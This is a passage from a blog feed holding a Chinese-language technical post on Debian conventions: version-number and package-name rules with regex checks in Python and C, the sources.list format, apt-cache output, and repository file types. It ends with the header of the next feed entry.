id="正则匹配版本号是否规范"><a href="#正则匹配版本号是否规范" class="headerlink" title="正则匹配版本号是否规范"></a>正则匹配版本号是否规范</h3><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">rule=<span class="string">r&quot;^(?:[0-9]+:)?[0-9][0-9a-zA-Z\.~+]*(?:-[0-9a-zA-Z\.+~]+)?$&quot;</span></span><br><span class="line">version=<span class="string">&quot;1:2.1.~31a-1be.ta4a+es&quot;</span></span><br><span class="line">res=re.fullmatch(rule,version)</span><br><span class="line"><span class="keyword">if</span> res:</span><br><span class="line">    <span class="built_in">print</span>(res[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不匹配&quot;</span>)</span><br></pre></td></tr></table></figure><p>C</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>                                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;regex.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">if_version</span><span class="params">(<span class="type">char</span> *version)</span>&#123;</span><br><span class="line">    <span class="type">char</span> *pattern =<span class="string">&quot;^([0-9]+:)?[0-9][0-9a-zA-Z\\.~+]*(-[0-9a-zA-Z\\.+~]+)?$&quot;</span>;</span><br><span class="line">    <span class="type">regex_t</span> reg;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">if</span>(regcomp(&amp;reg,pattern,REG_EXTENDED) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res = regexec(&amp;reg,version,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(res != REG_NOERROR)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *version = <span class="string">&quot;1:1.01a~23-1-beta1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(if_version(version))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not match\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="正则获取epoch、upstream-version、debian-revision"><a href="#正则获取epoch、upstream-version、debian-revision" class="headerlink" title="正则获取epoch、upstream-version、debian-revision"></a>正则获取epoch、upstream-version、debian-revision</h3><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_parts_of_the_version</span>(<span class="params">version</span>):</span><br><span class="line">    rule=<span class="string">r&quot;^([0-9]+:)?([0-9][0-9a-zA-Z\.~+]*)(-[0-9a-zA-Z\.+~]+)?$&quot;</span></span><br><span class="line">    res=re.findall(rule,version)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        res=res[<span class="number">0</span>]</span><br><span class="line">        epoch=res[<span class="number">0</span>]</span><br><span class="line">        upstream_version=res[<span class="number">1</span>]</span><br><span class="line">        debian_revision=res[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;不符合规范&quot;</span>)</span><br><span class="line">get_parts_of_the_version(<span class="string">&quot;2.1.~31a-1be.ta4a+es-1&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="包名"><a href="#包名" class="headerlink" title="包名"></a>包名</h2><p><a href="https://www.debian.org/doc/debian-policy/ch-controlfields.html#s-f-source">https://www.debian.org/doc/debian-policy/ch-controlfields.html#s-f-source</a></p><h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Package names (both source and binary, see Package) must consist only of lower case letters (a-z), digits (0-9), plus (+) and minus (-) signs, and periods (.). They must be at least two characters long and must start with an alphanumeric character.</span><br></pre></td></tr></table></figure><h3 id="组成元素和命名规范"><a href="#组成元素和命名规范" class="headerlink" title="组成元素和命名规范"></a>组成元素和命名规范</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0-9</span><br><span class="line">a-z</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">.</span><br></pre></td></tr></table></figure><ul><li>必须以字母或数字开头</li><li>长度至少为2，包括2</li></ul><h3 id="正则匹配包名"><a href="#正则匹配包名" class="headerlink" title="正则匹配包名"></a>正则匹配包名</h3><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">if_package_name</span>(<span class="params">package_name</span>):</span><br><span class="line">    rule=<span class="string">r&quot;^[0-9a-z][0-9a-z\\.+-]+$&quot;</span></span><br><span class="line">    res=re.fullmatch(rule,package_name)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;不匹配&quot;</span>)</span><br><span class="line">package_name=<span class="string">&quot;python3&quot;</span></span><br><span class="line">if_package_name(package_name)</span><br></pre></td></tr></table></figure><p>C</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>                                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;regex.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">if_package_name</span><span class="params">(<span class="type">char</span> *package_name)</span>&#123;</span><br><span class="line">    <span class="type">char</span> *pattern =<span class="string">&quot;^[0-9a-z][0-9a-z\\.+-]+$&quot;</span>;</span><br><span class="line">    <span class="type">regex_t</span> reg;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">if</span>(regcomp(&amp;reg,pattern,REG_EXTENDED) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res = regexec(&amp;reg,package_name,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(res != REG_NOERROR)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *package_name = <span class="string">&quot;python3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(if_package_name(package_name))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not match\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sources-list"><a href="#sources-list" class="headerlink" title="sources.list"></a>sources.list</h2><p><a href="https://wiki.debian.org/SourcesList">https://wiki.debian.org/SourcesList</a></p><p>通常是如下格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://site.example.com/debian distribution component1 component2 component3</span><br><span class="line">deb-src http://site.example.com/debian distribution component1 component2 component3</span><br></pre></td></tr></table></figure><p><code>sources.list</code> 是 Debian 系统中用于配置 APT 软件包管理器的源列表文件。该文件位于 <code>/etc/apt</code> 目录下，用于指定从哪些软件源获取软件包和更新。</p><p>每行的内容表示一个软件源，其中可能包含以下几个字段：</p><ol><li><code>deb</code> 或 <code>deb-src</code>：指定该行是用于获取二进制软件包或源代码软件包的源。 <ul><li><code>deb</code> 表示获取二进制软件包。</li><li><code>deb-src</code> 表示获取源代码软件包。</li></ul></li><li>软件包源地址：指定软件源的地址。可以是 HTTP、HTTPS、FTP 或本地文件系统路径。 <ul><li>HTTP&#x2F;HTTPS 示例：<code>http://archive.debian.org/debian/</code> 或 <code>https://mirrors.example.com/debian/</code></li><li>FTP 示例：<code>ftp://ftp.debian.org/debian/</code></li><li>本地路径示例：<code>file:/mnt/cdrom/</code>，表示本地光盘或镜像文件的路径。</li></ul></li><li>发行版名称：指定要获取的 Debian 发行版名称，如 <code>stable</code>、<code>testing</code>、<code>unstable</code> 等。也可以使用发行版的代号，如 <code>buster</code>、<code>bullseye</code>、<code>sid</code> 等。</li><li>软件包分区：指定软件包所属的分区或组织。常见的分区包括 <code>main</code>、<code>contrib</code>、<code>non-free</code> 等。 <ul><li><code>main</code>：包含自由软件。</li><li><code>contrib</code>：包含一些依赖于非自由软件的软件包。</li><li><code>non-free</code>：包含非自由软件。</li></ul></li><li>可选的部分名称：指定软件包的可选部分，如 <code>main</code>, <code>restricted</code>, <code>universe</code>, <code>multiverse</code> 等。这取决于具体的发行版和配置。</li></ol><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><h3 id="apt-cache-showsrc"><a href="#apt-cache-showsrc" class="headerlink" title="apt-cache showsrc"></a>apt-cache showsrc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Package: apt</span><br><span class="line">Binary: apt, libapt-pkg5.0, libapt-inst2.0, apt-doc, libapt-pkg-dev, libapt-pkg-doc, apt-utils, apt-transport-https</span><br><span class="line">Version: 1.8.2.13-1</span><br><span class="line">Maintainer: APT Development Team &lt;de***@li***.org&gt;</span><br><span class="line">Build-Depends: cmake (&gt;= 3.4), debhelper (&gt;= 11.2~), docbook-xml, docbook-xsl, dpkg-dev (&gt;= 1.17.14), g++ (&gt;= 4:7), gettext (&gt;= 0.12), googletest &lt;!nocheck&gt; | libgtest-dev &lt;!nocheck&gt;, libbz2-dev, libdb-dev, libgnutls28-dev (&gt;= 3.4.6), liblz4-dev (&gt;= 0.0~r126), liblzma-dev, libseccomp-dev [amd64 arm64 armel armhf i386 mips mips64el mipsel ppc64el s390x hppa powerpc powerpcspe ppc64 x32], libsystemd-dev [linux-any], libudev-dev [linux-any], libzstd-dev (&gt;= 1.0), ninja-build, pkg-config, po4a (&gt;= 0.34-2), xsltproc, zlib1g-dev</span><br><span class="line">Build-Depends-Indep: doxygen, graphviz, w3m</span><br><span class="line">Architecture: any all</span><br><span class="line">Standards-Version: 4.1.1</span><br><span class="line">Format: 3.0 (quilt)</span><br><span class="line">Directory: pool/main/a/apt</span><br><span class="line">Files: </span><br><span class="line"> 77b1b0061ed37ff64cd0fa4ab7bc25cf 152500 apt_1.8.2.13-1.debian.tar.xz</span><br><span class="line"> 6014c5bd18389ac81823045e931a5c97 2140 apt_1.8.2.13-1.dsc</span><br><span class="line"> d374ced44608d160fc29e614258ba10e 2071440 apt_1.8.2.13.orig.tar.xz</span><br><span class="line">Checksums-Sha1: </span><br><span class="line"> 4d79b89d128995da2a48ad47777e9072afae3900 152500 apt_1.8.2.13-1.debian.tar.xz</span><br><span class="line"> 590993b2b8b73c6b9f0e02a60d96db2e74f858db 2140 apt_1.8.2.13-1.dsc</span><br><span class="line"> 925ad34c2253c3480c4de765e2407d744b6b2b4a 2071440 apt_1.8.2.13.orig.tar.xz</span><br><span class="line">Checksums-Sha256: </span><br><span class="line"> 73f609cce107f7e399a82019a1eea50c834b2b3c96437df1b8900370082a57e6 152500 apt_1.8.2.13-1.debian.tar.xz</span><br><span class="line"> 08506f0b0ab22b8e3ae44b069a1a98c4c64334ee129ec349e343e81bcb5b61ae 2140 apt_1.8.2.13-1.dsc</span><br><span class="line"> db91de7ab152eabfea5437c44bbded2c6ffd98e20947077a7a91339acc4b93b8 2071440 apt_1.8.2.13.orig.tar.xz</span><br><span class="line">Package-List:</span><br><span class="line"> apt deb admin important arch=any</span><br><span class="line"> apt-doc deb doc optional arch=all</span><br><span class="line"> apt-transport-https deb oldlibs optional arch=all</span><br><span class="line"> apt-utils deb admin important arch=any</span><br><span class="line"> libapt-inst2.0 deb libs optional arch=any</span><br><span class="line"> libapt-pkg-dev deb libdevel optional arch=any</span><br><span class="line"> libapt-pkg-doc deb doc optional arch=all</span><br><span class="line"> libapt-pkg5.0 deb libs optional arch=any</span><br><span class="line">Testsuite: autopkgtest</span><br><span class="line">Testsuite-Triggers: @builddeps@, aptitude, db-util, dpkg, fakeroot, gnupg, gnupg1, gnupg2, gpgv, gpgv1, gpgv2, libfile-fcntllock-perl, lsof, python3-apt, stunnel4, wget</span><br><span class="line">Uploaders: Michael Vogt &lt;m**@de***.org&gt;, Julian Andres Klode &lt;j**@de***.org&gt;, David Kalnischkies &lt;do*****@de***.org&gt;</span><br><span class="line">Vcs-Browser: https://salsa.debian.org/apt-team/apt</span><br><span class="line">Vcs-Git: https://salsa.debian.org/apt-team/apt.git</span><br></pre></td></tr></table></figure><h3 id="apt-cache-showpkg"><a href="#apt-cache-showpkg" class="headerlink" title="apt-cache showpkg"></a>apt-cache showpkg</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">Package: apt</span><br><span class="line">Versions: </span><br><span class="line">1.8.2.13-1 (/var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages) (/usr/lib/dpkg-db/status)</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-i386_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-i386_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"></span><br><span class="line">1.8.2.10-1+dde (/var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages)</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-i386_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"> Description Language: </span><br><span class="line">                 File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-i386_Packages</span><br><span class="line">                  MD5: 9fb97a88cb7383934ef963352b53b4a7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Depends: </span><br><span class="line">  apt-dbgsym,apt 1.8.2.10-1+dde</span><br><span class="line">  dpkg,apt</span><br><span class="line">  libapt-pkg5.0:i386,apt 1.6~</span><br><span class="line">  apt:i386,apt</span><br><span class="line">  libapt-pkg5.0,apt 1.8.2.10-1+dde</span><br><span class="line">  libapt-pkg5.0,apt 1.6~</span><br><span class="line">  dpkg,apt</span><br><span class="line">  apt-utils,apt 1.8.2.10-1+dde</span><br><span class="line">  apt-transport-https,apt 1.5~alpha4</span><br><span class="line">  xdeb,apt 0.7.26~exp6</span><br><span class="line">  org.yuan.yuan,apt</span><br><span class="line">  com.steampowered.steam-launcher,apt 1.6</span><br><span class="line">  com.codium,apt</span><br><span class="line">  libapt-pkg5.0:i386,apt 1.6~</span><br><span class="line">  apt:i386,apt</span><br><span class="line">  squid-deb-proxy-client,apt 0.7.25.3ubuntu1</span><br><span class="line">  wajig,apt</span><br><span class="line">  upgrade-system,apt 0.7.0</span><br><span class="line">  tasksel,apt</span><br><span class="line">  supermin,apt</span><br><span class="line">  packagesearch,apt 0.6.46.1</span><br><span class="line">  reprepro,apt 0.9.4</span><br><span class="line">  reportbug,apt</span><br><span class="line">  python3-reportbug,apt</span><br><span class="line">  python3-apt,apt</span><br><span class="line">  python-apt,apt</span><br><span class="line">  progress-linux-pgp-keys,apt</span><br><span class="line">  progress-linux,apt</span><br><span class="line">  libapt-pkg5.0,apt 1.6~</span><br><span class="line">  netselect-apt,apt</span><br><span class="line">  multistrap,apt</span><br><span class="line">  mmdebstrap,apt</span><br><span class="line">  lsb-release,apt</span><br><span class="line">  libsbuild-perl,apt</span><br><span class="line">  libapt-pkg5.0,apt 1.8.2.13-1</span><br><span class="line">  devscripts,apt 1.3~pre3</span><br><span class="line">  emdebian-archive-keyring,apt</span><br><span class="line">  dwww,apt</span><br><span class="line">  dpkg-www,apt</span><br><span class="line">  dpkg,apt</span><br><span class="line">  dh-make-perl,apt 1.1.8</span><br><span class="line">  dgit,apt</span><br><span class="line">  debconf,apt 0.3.12.1</span><br><span class="line">  deborphan,apt</span><br><span class="line">  debirf,apt</span><br><span class="line">  debian-goodies,apt</span><br><span class="line">  debian-cd,apt</span><br><span class="line">  debfoster,apt</span><br><span class="line">  apt-transport-tor,apt 1.6~alpha6</span><br><span class="line">  dctrl-tools,apt</span><br><span class="line">  daptup,apt</span><br><span class="line">  d-shlibs,apt</span><br><span class="line">  cron-apt,apt</span><br><span class="line">  auto-apt-proxy,apt</span><br><span class="line">  apticron-systemd,apt 1.1~exp9</span><br><span class="line">  apticron,apt 1.1~exp9</span><br><span class="line">  apt-utils,apt 1.8.2.13-1</span><br><span class="line">  apt-transport-tor,apt 1.3~rc1</span><br><span class="line">  apt-transport-https,apt 1.5~alpha4</span><br><span class="line">  apt-transport-s3,apt</span><br><span class="line">  apt-listchanges,apt 0.5.3</span><br><span class="line">  apt-src,apt</span><br><span class="line">  apt-show-versions,apt</span><br><span class="line">  apt-show-source,apt</span><br><span class="line">  apt-move,apt</span><br><span class="line">  apt-listbugs,apt 0.9.11</span><br><span class="line">  apt-file,apt 1.3~exp1~</span><br><span class="line">  apt-build,apt 0.8.16~exp3</span><br><span class="line">  apt-dbgsym,apt 1.8.2.13-1</span><br><span class="line">Dependencies: </span><br><span class="line">1.8.2.13-1 - adduser (0 (null)) gpgv (16 (null)) gpgv2 (16 (null)) gpgv1 (0 (null)) deepin-keyring (0 (null)) libapt-pkg5.0 (2 1.7.0~alpha3~) libc6 (2 2.15) libgcc1 (2 1:3.0) libgnutls30 (2 3.6.6) libseccomp2 (2 1.0.1) libstdc++6 (2 5.2) apt-transport-https (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) aptitude (3 0.8.10) ca-certificates (0 (null)) apt-doc (0 (null)) aptitude (16 (null)) synaptic (16 (null)) wajig (0 (null)) dpkg-dev (2 1.17.2) gnupg (16 (null)) gnupg2 (16 (null)) gnupg1 (0 (null)) powermgmt-base (0 (null)) apt-transport-https (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) aptitude:i386 (3 0.8.10) apt-transport-https:i386 (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt:i386 (32 (null)) apt-utils:i386 (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) </span><br><span class="line">1.8.2.10-1+dde - adduser (0 (null)) gpgv (16 (null)) gpgv2 (16 (null)) gpgv1 (0 (null)) debian-archive-keyring (0 (null)) libapt-pkg5.0 (2 1.7.0~alpha3~) libc6 (2 2.15) libgcc1 (2 1:3.0) libgnutls30 (2 3.6.6) libseccomp2 (2 1.0.1) libstdc++6 (2 5.2) apt-transport-https (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) aptitude (3 0.8.10) aptitude:i386 (3 0.8.10) ca-certificates (0 (null)) apt-doc (0 (null)) aptitude (16 (null)) synaptic (16 (null)) wajig (0 (null)) dpkg-dev (2 1.17.2) gnupg (16 (null)) gnupg2 (16 (null)) gnupg1 (0 (null)) powermgmt-base (0 (null)) apt-transport-https (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) apt:i386 (32 (null)) </span><br><span class="line">Provides: </span><br><span class="line">1.8.2.13-1 - apt-transport-https (= 1.8.2.13-1) </span><br><span class="line">1.8.2.10-1+dde - apt-transport-https (= 1.8.2.10-1+dde) </span><br><span class="line">Reverse Provides:</span><br></pre></td></tr></table></figure><h2 id="apt仓库"><a href="#apt仓库" class="headerlink" title="apt仓库"></a>apt仓库</h2><p><img src="/blog_imgs/Debian%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8C%E4%BB%93%E5%BA%93%E8%A7%84%E8%8C%83/1717638461674-32fc62bb-e337-4892-a0d9-150be8f36951.png"></p><ul><li><font style="color:rgb(0, 0, 0);">libgc 是源码包名</font></li><li><font style="color:rgb(0, 0, 0);">libgc-dev_7.6.4.2-2+dde_amd64.deb  是源码包编译出来的二进制包</font></li><li><font style="color:rgb(0, 0, 0);">libgc1c2-dbgsym_7.6.4.2-2+dde_amd64.deb  包名后面带有 -dbgsym 后缀的包是调试符号包（debug symbol package），这些包包含了与相应二进制包相关的调试信息</font></li><li><font style="color:rgb(0, 0, 0);">libgc_7.6.4.2-2+dde.debian.tar.xz 文件名带有 dde.debian.tar.xz 后缀的包是一种源代码包，特指 Deepin 桌面环境（Deepin Desktop Environment，简称 DDE）在 Debian 包管理系统中的源码包，用于对原始源码进行必要的修改和配置，以便在 Debian 系统上正确构建和打包。</font></li><li><font style="color:rgb(0, 0, 0);">libgc_7.6.4.2-2+dde.dsc  文件名带有 .dsc 后缀的文件是 Debian 源码控制文件（Debian Source Control file）。这个文件描述了 Debian 源码包的相关信息</font></li><li><font style="color:rgb(0, 0, 0);">libgc_7.6.4.2.orig.tar.xz   文件名带有 .orig.tar.xz 后缀的包是原始源码包（original source tarball）。这些包包含了上游开发者发布的原始源代码，没有经过任何修改</font></li></ul><h2 id="安全公告"><a href="#安全公告" class="headerlink" title="安全公告"></a>安全公告</h2><p><a href="https://security-team.debian.org/security_tracker.html">https://security-team.debian.org/security_tracker.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;版本号&quot;&gt;&lt;a href=&quot;#版本号&quot; class=&quot;headerlink&quot; title=&quot;版本号&quot;&gt;&lt;/a&gt;版本号&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://manpages.debian.org/wheezy/dpkg-dev/deb-version.5</summary>
      
    
    
    
    
    <category term="Linux" scheme="https://lyi61pd.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux延迟绑定</title>
    <link href="https://lyi61pd.github.io/2025/04/10/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    <id>https://lyi61pd.github.io/2025/04/10/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</id>
    <published>2025-04-10T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
